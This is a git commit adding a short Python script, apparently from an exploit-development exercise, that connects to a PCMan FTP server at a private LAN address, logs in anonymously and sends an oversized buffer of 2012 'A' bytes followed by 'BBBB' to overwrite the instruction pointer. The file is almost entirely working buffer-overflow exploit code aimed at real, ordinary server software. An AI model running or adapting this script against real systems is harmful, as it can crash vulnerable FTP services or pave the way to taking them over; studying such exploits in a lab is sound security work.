44ae9931bf6c39f7a3a790f290b43a8c1ef4d3fa
Rajib Bardhan <60964983+rajibbardhan007@users.noreply.github.com>
2020-08-13 22:01:18 +0530

    Add files via upload

---
+++ PCMan/controleip.py
@@ -0,0 +1,27 @@
+import socket
+
+import sys
+
+USER    = "anonymous"
+
+PASSWD  = "TEST"
+
+PAYLOAD = "\x41" * 2012 + "BBBB"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect(("192.168.1.6",21))
+
+data = s.recv(1024)
+
+s.send("USER " + USER + '\r\n')
+
+data = s.recv(1024)
+
+s.send("PASS " + PASSWD + '\r\n')
+
+data = s.recv(1024)
+
+s.send(PAYLOAD +'\r\n')
+
+s.close()
